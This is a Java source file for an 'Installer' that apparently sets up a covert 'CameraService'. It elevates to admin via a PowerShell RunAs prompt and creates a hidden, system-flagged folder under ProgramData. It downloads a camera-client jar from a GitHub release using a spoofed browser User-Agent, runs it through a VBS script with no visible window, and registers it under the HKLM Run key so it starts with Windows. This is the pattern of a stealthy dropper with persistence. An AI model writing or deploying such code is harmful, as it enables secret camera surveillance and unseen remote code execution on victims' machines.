import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Installer {

    static final String APP_NAME     = "CameraService";
    static final String DOWNLOAD_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
    static final String INSTALL_DIR  = "C:\\ProgramData\\CameraService";
    static final String JAR_NAME     = "camera-client.jar";
    static final String LAUNCH_SCRIPT= INSTALL_DIR + "\\launch.vbs";
    static final String LOG_FILE     = "C:\\ProgramData\\installer.log";

    public static void main(String[] args) throws Exception {
        // Log to file (works for both admin and non-admin runs)
        try {
            PrintStream log = new PrintStream(new FileOutputStream(LOG_FILE, true));
            System.setOut(log);
            System.setErr(log);
        } catch (Exception ignored) {}

        System.out.println("\n--- Installer started ---");

        if (!isAdmin()) {
            System.out.println("[*] Requesting admin rights...");
            relaunchAsAdmin();
            return;
        }

        System.out.println("[*] Installing " + APP_NAME + "...");

        // 1. Create install directory and hide it
        File installDir = new File(INSTALL_DIR);
        installDir.mkdirs();
        new ProcessBuilder("attrib", "+H", "+S", INSTALL_DIR).start().waitFor();
        System.out.println("[*] Created directory: " + INSTALL_DIR);

        // 2. Download jar only if not already present
        File jar = new File(INSTALL_DIR + "\\" + JAR_NAME);
        if (!jar.exists()) {
            // fetch version number first and log it
            try {
                String versionUrl = DOWNLOAD_URL.replace("camera-client.jar", "version.txt");
                HttpURLConnection vc = (HttpURLConnection) new URL(versionUrl).openConnection();
                vc.setInstanceFollowRedirects(true);
                vc.setConnectTimeout(5000); vc.setReadTimeout(5000);
                if (vc.getResponseCode() == 200) {
                    String ver = new String(vc.getInputStream().readAllBytes()).trim();
                    System.out.println("[*] Downloading camera client v" + ver + "...");
                    // write version.txt to install dir
                    try (FileWriter vw = new FileWriter(INSTALL_DIR + "\\version.txt")) { vw.write(ver); }
                } else {
                    System.out.println("[*] Downloading camera client (latest)...");
                }
            } catch (Exception e) {
                System.out.println("[*] Downloading camera client (version check failed: " + e.getMessage() + ")...");
            }
            downloadFile(DOWNLOAD_URL, jar);
            System.out.println("[*] Downloaded.");
        } else {
            System.out.println("[*] Jar already exists, skipping download.");
        }

        // 3. Write VBS launcher (no quotes around jar path needed since no spaces)
        String vbs = "Set WshShell = CreateObject(\"WScript.Shell\")\r\n"
                   + "WshShell.Run \"java --enable-native-access=ALL-UNNAMED -jar "
                   + INSTALL_DIR + "\\" + JAR_NAME
                   + "\", 0, False\r\n";
        try (FileWriter fw = new FileWriter(LAUNCH_SCRIPT)) { fw.write(vbs); }
        System.out.println("[*] Created launcher.");

        // 4. Register startup
        String[] reg = {
            "reg", "add",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", APP_NAME,
            "/t", "REG_SZ",
            "/d", "wscript.exe \"" + LAUNCH_SCRIPT + "\"",
            "/f"
        };
        Process p = new ProcessBuilder(reg).start();
        p.waitFor();
        System.out.println(p.exitValue() == 0 ? "[*] Registered in startup." : "[!] Startup registration failed.");

        // 5. Launch now
        new ProcessBuilder("wscript.exe", LAUNCH_SCRIPT).start();
        System.out.println("[+] Done. Camera service is running.");
    }

    static boolean isAdmin() {
        try {
            Process p = new ProcessBuilder("net", "session").redirectErrorStream(true).start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    static void relaunchAsAdmin() throws Exception {
        // Get the jar path — works even from ProgramData
        String jarPath = new File(
            Installer.class.getProtectionDomain().getCodeSource().getLocation().toURI()
        ).getAbsolutePath();
        new ProcessBuilder(
            "powershell", "-Command",
            "Start-Process", "java",
            "-ArgumentList", "'-jar','" + jarPath + "'",
            "-Verb", "RunAs"
        ).start();
    }

    static void downloadFile(String urlStr, File dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192];
            int read;
            while ((read = in.read(buf)) != -1) out.write(buf, 0, read);
        }
    }
}
